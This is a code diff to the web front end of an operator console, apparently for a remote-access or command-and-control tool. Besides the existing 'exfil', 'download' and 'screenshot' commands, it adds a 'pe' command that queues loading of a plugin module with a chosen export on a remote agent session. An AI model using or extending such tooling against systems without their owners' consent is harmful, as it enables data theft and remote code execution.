@@ -10,7 +10,7 @@ const SHELL_HISTORY_MAX = 100;
 const SHELL_DISPATCH_PREFIXES = ["cmd:", "PS:", "powershell:", "pwsh:"];
 
 /** Operator meta commands (rmm_cli.py) — routed to REST, not the agent shell. */
-const SHELL_META_COMMANDS = ["exfil", "download", "screenshot"];
+const SHELL_META_COMMANDS = ["exfil", "download", "screenshot", "pe"];
 
 const state = {
   token: sessionStorage.getItem(STORAGE_KEY) || "",
@@ -1349,6 +1349,7 @@ function historyOperatorMeta(body) {
   if (action === "exfil") return "(exfil queued)";
   if (action === "upload") return "(upload queued)";
   if (action === "screenshot") return "(screenshot queued)";
+  if (action === "pe") return "(plugin load queued)";
   if (action === "config") return null;
   return null;
 }
@@ -1360,6 +1361,7 @@ function historyOperatorKind(body) {
     exfil: "exfil",
     upload: "upload",
     screenshot: "screenshot",
+    pe: "pe",
   };
   return map[action] || null;
 }
@@ -2235,6 +2237,23 @@ async function postScreenshotQueue() {
   return true;
 }
 
+async function postPeQueue(plugin, exportName, pluginInput) {
+  const { status, data } = await api(
+    `/sessions/${encodeURIComponent(state.selectedId)}/pe`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ plugin, export: exportName, input: pluginInput }),
+    }
+  );
+  if (status !== 200) {
+    appendShellError(data.error || `HTTP ${status}`);
+    return false;
+  }
+  pollSessionEvents().catch(() => {});
+  return true;
+}
+
 /** @returns {boolean} true if cmd was a meta command (handled locally). */
 async function dispatchShellMetaCommand(cmd) {
   const words = parseShellWords(cmd);
@@ -2293,6 +2312,25 @@ async function dispatchShellMetaCommand(cmd) {
       matchKeys: ["screenshot", "__SCREENSHOT__"],
     });
     await postScreenshotQueue();
+    return true;
+  }
+
+  if (verb === "pe") {
+    if (!rest.length) {
+      appendShellError("Usage: pe <plugin> [export] [input]");
+      return true;
+    }
+    const plugin = rest[0];
+    const exportName = rest[1] || "Run";
+    const pluginInput = rest.length > 2 ? rest.slice(2).join(" ") : "";
+    const queued = `__PE_LOAD__ ${plugin} ${exportName}${pluginInput ? ` ${pluginInput}` : ""}`;
+    appendShellEcho(cmd, {
+      block: true,
+      kind: "pe",
+      meta: "(plugin load queued)",
+      matchKeys: [cmd, queued],
+    });
+    await postPeQueue(plugin, exportName, pluginInput);
     return true;
   }
 
